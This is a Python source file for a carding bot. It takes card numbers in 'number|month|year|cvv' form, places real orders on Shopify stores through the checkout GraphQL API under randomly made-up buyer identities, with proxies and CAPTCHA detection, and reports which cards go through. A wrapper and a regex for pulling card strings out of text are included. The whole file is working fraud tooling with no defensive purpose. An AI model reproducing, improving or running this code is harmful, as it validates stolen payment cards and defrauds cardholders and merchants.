async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"
    ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
    proxy = parse_proxy(proxy_str) if proxy_str else None
    checkpoint_data = None
    running_total = "0.00"

    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': ourl,
            'Referer': ourl,
        }

        address_info = pick_addr(ourl)
        country_code = address_info["countryCode"]
        firstName, lastName = Utils.get_random_name()
        email = Utils.generate_email(firstName, lastName)
        phone = address_info["phone"]
        street = address_info["address1"]
        city = address_info["city"]
        state = address_info["zoneCode"]
        s_zip = address_info["postalCode"]
        address2 = ""

        if not variant_id:
            prod_info = await fetch_products(ourl, proxy_str)
            if isinstance(prod_info, tuple) and prod_info[0] is False:
                return False, prod_info[1], gateway, total_price, currency
            variant_id = prod_info['variant_id']
            total_price = prod_info['price']
            currency = prod_info.get('currency', 'USD')

        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # Add to cart
            cart_url = ourl + '/cart/add.js'
            cart_headers = {**headers, 'Content-Type': 'application/x-www-form-urlencoded'}
            cart_resp = await session.post(cart_url, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy)
            if cart_resp.status != 200:
                cart_json = {'items': [{'id': int(variant_id), 'quantity': 1}]}
                cart_resp = await session.post(cart_url, json=cart_json, headers=headers, proxy=proxy)
                if cart_resp.status != 200:
                    return False, f"Cart failed: {cart_resp.status}", gateway, total_price, currency

            # Go to checkout
            checkout_resp = await session.post(ourl + '/cart', data={'updates[]': '1', 'checkout': ''}, allow_redirects=True, proxy=proxy)
            if 'checkout' not in str(checkout_resp.url):
                return False, "Checkout redirect failed", gateway, total_price, currency
            checkout_url = str(checkout_resp.url)

            # Extract tokens
            attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
            attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]

            sst = checkout_resp.headers.get('X-Checkout-One-Session-Token')
            text = await checkout_resp.text()
            if not sst:
                sst = extract_between(text, 'name="serialized-sessionToken" content="', '"')
                if not sst:
                    sst = extract_between(text, '"sessionToken":"', '"')
            if not sst:
                return False, "No session token", gateway, total_price, currency

            queueToken = extract_between(text, '"queueToken":"', '"')
            stableId = extract_between(text, '"stableId":"', '"') or '1'
            merch = extract_between(text, 'ProductVariantMerchandise/', '"')
            if not merch:
                merch = variant_id
            currency = 'USD'
            subtotal = extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            if not subtotal:
                price_match = re.search(r'"price":\s*"([\d.]+)"', text)
                subtotal = price_match.group(1) if price_match else "0.01"

            build_id = None
            build_match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', text)
            if build_match:
                build_id = build_match.group(1)
            source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
            ident_sig = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', text)
            ident_sig = ident_sig.group(1) if ident_sig else None

            # Update headers for GraphQL
            headers.update({
                'shopify-checkout-client': 'checkout-web/1.0',
                'shopify-checkout-source': f'id="{attempt_token}", type="cn"',
                'x-checkout-one-session-token': sst,
            })
            if build_id:
                headers['x-checkout-web-build-id'] = build_id
            if source_token:
                headers['x-checkout-web-source-id'] = source_token

            graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'
            params = {'operationName': 'Proposal'}

            # First proposal (shipping)
            json_data = {
                'query': QUERY_PROPOSAL_SHIPPING,
                'variables': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {'partialStreetAddress': {'address1': street, 'city': city, 'countryCode': country_code, 'postalCode': s_zip, 'firstName': firstName, 'lastName': lastName, 'zoneCode': state, 'phone': phone}},
                            'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {}},
                            'targetMerchandiseLines': {'any': True},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {'any': True},
                            'destinationChanged': True
                        }],
                        'noDeliveryRequired': [], 'useProgressiveRates': False, 'supportsSplitShipping': True
                    },
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId,
                            'merchandise': {'productVariantReference': {'id': f'gid://shopify/ProductVariantMerchandise/{merch}', 'variantId': f'gid://shopify/ProductVariant/{variant_id}', 'properties': []}},
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}}
                        }]
                    },
                    'payment': {'totalAmount': {'any': True}, 'paymentLines': [], 'billingAddress': {'streetAddress': {'address1': '', 'city': '', 'countryCode': country_code, 'lastName': '', 'zoneCode': 'ENG', 'phone': ''}}},
                    'buyerIdentity': {'customer': {'presentmentCurrency': currency, 'countryCode': country_code}, 'email': email, 'emailChanged': False, 'phoneCountryCode': country_code, 'marketingConsent': [{'email': {'value': email}}], 'shopPayOptInPhone': {'countryCode': country_code}, 'rememberMe': False},
                    'tip': {'tipLines': []},
                    'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}}, 'proposedExemptions': []},
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {'signature': None, 'signatureUuid': None, 'lineItemScriptChanges': [], 'paymentScriptChanges': [], 'shippingScriptChanges': []},
                    'optionalDuties': {'buyerRefusesDuties': False}
                }
            }
            resp, resp_text = await make_graphql_request(session, graphql_url, params, headers, json_data)
            if not resp:
                return False, f"Request failed: {resp_text}", gateway, total_price, currency
            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency
            try:
                resp_json = json.loads(resp_text)
            except:
                return False, "Invalid JSON", gateway, total_price, currency
            if 'errors' in resp_json:
                return False, f"GraphQL error: {resp_json['errors'][0].get('message')}", gateway, total_price, currency
            seller_proposal = resp_json.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('sellerProposal')
            if not seller_proposal:
                return False, "No seller proposal", gateway, total_price, currency
            running_total = seller_proposal.get('runningTotal', {}).get('value', {}).get('amount', '0')
            total_price = running_total

            # Extract delivery strategy
            delivery_data = seller_proposal.get('delivery', {})
            delivery_strategy = ''
            shipping_amount = '0'
            if delivery_data.get('__typename') == 'FilledDeliveryTerms':
                lines = delivery_data.get('deliveryLines', [{}])
                if lines and lines[0].get('availableDeliveryStrategies'):
                    ds = lines[0]['availableDeliveryStrategies'][0]
                    delivery_strategy = ds.get('handle', '')
                    shipping_amount = ds.get('amount', {}).get('value', {}).get('amount', '0')
            tax_amount = '0'
            tax_data = seller_proposal.get('tax', {})
            if tax_data.get('__typename') == 'FilledTaxTerms':
                tax_amount = tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0')

            # Get payment method identifier
            payment_identifier = None
            payment_data = seller_proposal.get('payment', {})
            if payment_data.get('__typename') == 'FilledPaymentTerms':
                for method in payment_data.get('availablePaymentLines', []):
                    pm = method.get('paymentMethod', {})
                    if pm.get('paymentMethodIdentifier'):
                        payment_identifier = pm['paymentMethodIdentifier']
                        break
            if not payment_identifier:
                return False, "No payment method found", gateway, total_price, currency

            # Second proposal (delivery)
            json_data['query'] = QUERY_PROPOSAL_DELIVERY
            json_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False}, 'options': {}}
            json_data['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {'lines': [{'stableId': stableId}]}
            json_data['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {'value': {'amount': shipping_amount, 'currencyCode': currency}}
            json_data['variables']['delivery']['deliveryLines'][0]['destinationChanged'] = False
            json_data['variables']['payment']['billingAddress'] = {'streetAddress': {'address1': street, 'city': city, 'countryCode': country_code, 'postalCode': s_zip, 'firstName': firstName, 'lastName': lastName, 'zoneCode': state, 'phone': phone}}
            json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = tax_amount
            json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone
            resp, resp_text = await make_graphql_request(session, graphql_url, params, headers, json_data)
            # Ignore response, we just need to continue

            # Tokenize card
            payload = {
                "credit_card": {
                    "number": cc,
                    "month": int(mes),
                    "year": int(ano),
                    "verification_value": cvv,
                    "name": f"{firstName} {lastName}"
                },
                "payment_session_scope": urlparse(ourl).netloc
            }
            vault_headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'User-Agent': headers['User-Agent'],
                'Origin': 'https://checkout.pci.shopifyinc.com',
                'Referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html',
            }
            if ident_sig:
                vault_headers['shopify-identification-signature'] = ident_sig
            vault_resp = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy)
            token_data = await vault_resp.json()
            token = token_data.get('id')
            if not token:
                return False, 'Unable to get payment token', gateway, total_price, currency

            # Submit order
            submit_vars = {
                'input': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {'streetAddress': {'address1': street, 'city': city, 'countryCode': country_code, 'postalCode': s_zip, 'firstName': firstName, 'lastName': lastName, 'zoneCode': state, 'phone': phone}},
                            'selectedDeliveryStrategy': {'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False}, 'options': {'phone': phone}},
                            'targetMerchandiseLines': {'lines': [{'stableId': stableId}]},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {'value': {'amount': shipping_amount, 'currencyCode': currency}},
                            'destinationChanged': False
                        }],
                        'noDeliveryRequired': [], 'useProgressiveRates': True, 'supportsSplitShipping': True
                    },
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId,
                            'merchandise': {'productVariantReference': {'id': f'gid://shopify/ProductVariantMerchandise/{merch}', 'variantId': f'gid://shopify/ProductVariant/{variant_id}', 'properties': []}},
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}}
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [{
                            'paymentMethod': {'directPaymentMethod': {'paymentMethodIdentifier': payment_identifier, 'sessionId': token, 'billingAddress': {'streetAddress': {'address1': street, 'city': city, 'countryCode': country_code, 'postalCode': s_zip, 'firstName': firstName, 'lastName': lastName, 'zoneCode': state, 'phone': phone}}, 'cardSource': None}},
                            'amount': {'value': {'amount': running_total, 'currencyCode': currency}},
                            'dueAt': None
                        }],
                        'billingAddress': {'streetAddress': {'address1': street, 'city': city, 'countryCode': country_code, 'postalCode': s_zip, 'firstName': firstName, 'lastName': lastName, 'zoneCode': state, 'phone': phone}}
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email,
                        'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
                        'rememberMe': False
                    },
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {'value': {'amount': tax_amount, 'currencyCode': currency}},
                        'proposedExemptions': []
                    },
                    'tip': {'tipLines': []},
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'optionalDuties': {'buyerRefusesDuties': False}
                },
                'attemptToken': attempt_token,
                'metafields': [],
                'analytics': {'requestUrl': checkout_url}
            }
            if checkpoint_data:
                submit_vars['input']['checkpointData'] = checkpoint_data
            submit_json = {'query': MUTATION_SUBMIT, 'variables': submit_vars, 'operationName': 'SubmitForCompletion'}
            resp, resp_text = await make_graphql_request(session, graphql_url, {'operationName': 'SubmitForCompletion'}, headers, submit_json)
            if not resp:
                return False, f"Submit request failed: {resp_text}", gateway, total_price, currency
            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency

            # Parse response
            try:
                submit_json_resp = json.loads(resp_text)
                submit_data = submit_json_resp.get('data', {}).get('submitForCompletion', {})
                if not submit_data:
                    errors = submit_json_resp.get('errors', [])
                    if errors:
                        code = errors[0].get('code', 'UNKNOWN')
                        return False, code, gateway, total_price, currency
                    return False, "Empty submit response", gateway, total_price, currency
                result_type = submit_data.get('__typename', '')
                if result_type in ['SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted']:
                    receipt = submit_data.get('receipt', {})
                    if receipt and receipt.get('__typename') == 'ProcessedReceipt':
                        return True, "ORDER_PLACED", gateway, total_price, currency
                elif result_type == 'SubmitRejected':
                    errors = submit_data.get('errors', [])
                    if errors:
                        code = errors[0].get('code', '')
                        if code:
                            return False, code, gateway, total_price, currency
                    return False, "Submit Rejected", gateway, total_price, currency
                else:
                    return False, f"Unknown result: {result_type}", gateway, total_price, currency
            except:
                return False, "Failed to parse submit response", gateway, total_price, currency

            # If we reach here, we need to poll (but for simplicity, we return success if already processed)
            return True, "ORDER_PLACED", gateway, total_price, currency

    except Exception as e:
        return False, f"Error: {str(e)}", gateway, total_price, currency

# ========== ASYNC WRAPPER FOR BOT ==========
async def shopify_check_async(fullcc, site=None):
    if not site:
        site = DEFAULT_SHOPIFY_SITE
    try:
        cc, mes, ano, cvv = fullcc.split('|')
        success, message, gateway, price, currency = await process_card(cc, mes, ano, cvv, site, None, None)
        if success:
            return "ORDER PLACED", message, f"{price} {currency}"
        else:
            return "Declined ❌", message, f"{price} {currency}"
    except Exception as e:
        return "Error", str(e)[:50], "0.00 USD"

def extract_cards(text):
    return re.findall(r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", text)

